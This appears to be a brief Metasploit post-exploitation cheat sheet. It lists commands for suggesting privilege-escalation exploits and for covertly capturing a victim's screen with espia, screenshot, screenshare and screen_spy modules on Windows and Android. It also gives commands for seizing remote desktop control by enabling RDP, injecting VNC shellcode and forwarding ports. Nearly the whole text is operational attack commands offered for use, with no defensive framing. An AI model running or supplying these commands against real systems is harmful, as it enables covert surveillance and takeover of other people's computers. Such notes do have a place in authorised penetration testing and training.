## Privesc exploit suggestion
```
multi/recon/local_exploit_suggester
```

---

## Spying
#### screengrab
```
meterpreter> load espia
meterpreter> screengrab
```

#### screenshot
```
meterpreter> screenshot
```

#### screenshare
```
meterpreter> screenshare
```

#### Other modules:
post/windows/gather/screen_spy
post/android/capture/screen

---

## Control desktop

```
post/windows/manage/enable_rdp
run vnc -h

# via shellcode inject
> use payload/windows/x64/vncinject/bind_tcp
> generate -f raw -o vnc.bin
> use post/windows/manage/shellcode_inject
> set SHELLCODE ./vnc.bin
> exploit
> portfwd add -l 5555 -r 127.0.0.1 -p 4444
# you can connect on 127.0.0.1:5555

# other example:
run vnc -V
```